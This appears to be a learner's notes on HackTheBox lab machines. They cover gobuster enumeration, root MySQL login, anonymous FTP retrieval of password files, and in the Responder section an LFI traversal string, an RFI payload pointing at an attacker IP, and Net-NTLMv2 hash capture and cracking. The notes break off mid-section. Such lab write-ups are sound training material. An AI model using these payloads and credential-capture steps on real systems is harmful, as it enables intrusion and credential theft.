
# Appoinment 

-> uses **http (port 80)**, and **gobuster** to enumarete throught the subdirectories

```bash
# Basic directory enumeration
gobuster dir -u https://example.com -w /path/to/wordlist.txt

# DNS subdomain enumeration
gobuster dns -do example.com -w /path/to/wordlist.txt

# Virtual host discovery
gobuster vhost -u https://example.com -w /path/to/wordlist.txt

# S3 bucket enumeration
gobuster s3 -w /path/to/bucket-names.txt
```

kali stores its wordlists in 
```bash
/usr/share/wordlists
```

# Sequel

-> uses mysql (port 3306)

```bash
mysql -h {HOSTNAME} -P 3306 -u {USER/root} -p
```

-> after successfully logging in:
```sql
SHOW DATABASES;               -- lists all databases on the server
USE {DATABASE};               -- selects a database (not a table)
SHOW TABLES;                  -- lists tables in the selected database
DESCRIBE {TABLE};             -- shows a table's columns and types
SELECT * FROM {TABLE};        -- returns every row in a table
SELECT * FROM {TABLE} WHERE {COLUMN} = 'value';   -- filters rows
```


# Crocodile

-> uses ftp (port 21) and gobuster
```bash
ftp -a {HOST_MACHINE}   # uses anonymous login or you can use normal connection and use "anonymous as the username"

# after looking through the dir
>get allowed.userlist 
>get allowed.userlist.passwd
>bye
```


```
```bash
# With file extensions
gobuster dir -u https://example.com -w wordlist.txt -x php,html,js,txt
```

-> use gobuster enumerate through file extensions to get the directory to login.php through 
```python
http://10.129.1.15/dashboard/index.php
```



# Responder

-> http (port 80) | unika.htb
-> wsman (port 5985) | Web Services for Management

run it through:

```curl
└─$ curl -s 10.129.210.220
<meta http-equiv="refresh" content="0;url=http://unika.htb/">              
```

-> you get the hostname

```bash
sudo vi /etc/hosts 

{HOSTNAME_IP} unika.htb  # put the web address into etc hosts file for access
```
 
-> put it to /etc/hosts
- ![[Pasted image 20261115054924.png|629]]

-> in this box, we will take advantage of the `page=` parameter for language

-> An **LFI** is accessing a file on the local system that isn't intended to be read.
```bash
../../../../../../../../windows/system32/drivers/etc/hosts
```
-> An **RFI** tricks the server into including file from another server such as the attacker's server.
```
//10.10.14.224/somefile
```

-> Responder utility tool
- Capture credentials and perform Adversary-in-the-Middle (AiTM) attacks on local networks

```bash
sudo responder -I tun0      
# listens on tun0 virt interface for LLMNR, NBT-NS and mDNS broadcast requests
```


-> Net-NTLMv2 is the challenge-response authentication protocol used by Windows to verify a user's identity over a network (such as SMB, HTTP, or LDAP) without sending the actual password in plaintext.
- **john the ripper**: takes that Net-NTLMv2 challenge-response then tries millions of passwords to check for collisions


-> after getting the password credentials, since we have discovered using a full port scan, the box runs wsman (port 5985),

- 